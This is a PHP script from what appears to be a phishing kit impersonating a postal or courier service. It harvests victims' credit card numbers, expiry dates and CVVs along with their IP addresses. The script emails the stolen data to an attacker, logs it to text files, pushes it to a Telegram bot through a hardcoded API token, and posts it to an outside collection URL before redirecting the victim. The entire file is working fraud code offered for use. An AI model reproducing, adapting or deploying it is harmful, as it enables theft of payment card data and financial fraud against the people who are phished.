<?php
include("../../system/os.php");
include "../email.php";
error_reporting(0);
$num=$_REQUEST['MCO'];

$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeancc'] != "") AND ($_POST['card_expiration_month'] != "") AND ($_POST['card_expiration_year'] != "") AND ($_POST['jeancvv'] != "") )
{
$hostname = gethostbyaddr($ip);
            $message = "CC :" . $_POST['jeancc'] . "\nEXP :" . $_POST['card_expiration_month'] ."/". $_POST['card_expiration_year'] ."\nCVV :" . $_POST['jeancvv'] . "\n" . $ip . "\n*****************************\n";
$send = "$to";
$subject = "NEW Die Post VICTIM CARD INFO FROM = $ip";
$headers = "From: J E A N <dhl@jean8.vip>";
mail($send,$subject,$message,$headers);
file_put_contents("../../nj.txt", $message, FILE_APPEND);
if(!isset($_REQUEST['jeancc']) || $_REQUEST['jeancc']=='' ){
	die("<script type='text/javascript'>top.location ='../../secure.php?$rand_tarikh';</script>");
}
if(!isset($_REQUEST['jeancvv']) || $_REQUEST['jeancvv']=='' ){
	die("<script type='text/javascript'>top.location ='../../secure.php?$rand_tarikh';</script>");
}
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1244123994:AAEG5OQvqUXTvyMmc4QWOvgYKIxy1ofq55g';
    $chat_id  = '1128003836';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send(urlencode($message));
echo "<meta http-equiv='refresh' content='5; url=../../secure.php'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='5; ../../secure.php' />";
}

$cccnum = $_REQUEST['jeancc'];
$cc = str_split($cccnum, 4);
$cctemp = $cc[0] .' ' . $cc[1] .' ' .$cc[2] .' ' .$cc[3];
$exm = $_REQUEST['card_expiration_month'];
$exy = $_REQUEST['card_expiration_year'];
$exytemp = str_split($exy, 2);
$exystemp = $exytemp[1];
$cccv = $_REQUEST['jeancvv'];
$num =   $_REQUEST['MCO'];
$bin4 = substr($cccnum , 12 , 16);
$bin = substr($cccnum , 12 , 16);
// 4978071234 567890
if(strlen($cccnum) < 15)
{
    die("<script type='text/javascript'>top.location ='../../secure.php?$rand_tarikh';</script>");

}else{

	if(strlen($cccv) < 3){
		die("<script type='text/javascript'>top.location ='../../secure.php?$rand_tarikh';</script>");

	}else{

        $data = "
+ --------- $subj ---------+<br>
+ -------------------------------------------------------------+
<body>
+ CORREOS OK <br>
<h2>$cctemp</h2>
<h2>$exm/$exystemp</h2>
<h2>$cccv</h2>
+ -------------------------------------------------------------+<br>
  BIN : $bin <br>
  NUM : $num <br>
  CC : $cccnum <br>
+ -------------------------------------------------------------+ <br>
+ Victim Information <br>
 $VictimInfo <br>
+ -------------------------------------------------------------+ <br></body>
";
if($Save_Log==1) { $file = fopen("login.txt","a+"); fwrite($file, $data); fclose($file);}
if($Send_Log==1) {

$curl = curl_init();
// Set some options - we are passing in a useragent too here
curl_setopt_array($curl, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => "https://cline.in/sendcurl7.php?subject=".urlencode($subj)."&sms=".urlencode($data),
	CURLOPT_CONNECTTIMEOUT=> 0,
    CURLOPT_TIMEOUT=> 5,
));
// Send the request & save response to $resp
$resp = curl_exec($curl);

// Close request to clear up some resources
curl_close($curl);


 }
die("<script type='text/javascript'>top.location = '../../secure.php?ligne=$num&page2=$bin';</script>");

	}

}

?>
